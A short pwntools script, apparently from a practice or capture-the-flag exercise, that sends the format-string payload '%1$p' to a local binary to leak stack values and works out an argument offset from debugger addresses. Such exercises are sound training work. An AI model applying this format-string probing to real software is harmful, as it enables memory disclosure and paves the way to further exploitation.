#!/usr/bin/env python


from pwn import *
import os

p = process("./fs-read-2-64")

print(p.recv())


buf = "%1$p"


p.sendline(buf)

'''

pwndbg> 0x4c69e380e
pwndbg> 0x7fff951a7d00


pwndbg> 0x7ffca1c7f2b0
pwndbg> 0x7ffca1c7f070



'''

offset = (0x7ffca1c7f2b0 - 0x7ffca1c7f070) / 8
print(offset)
p.interactive()
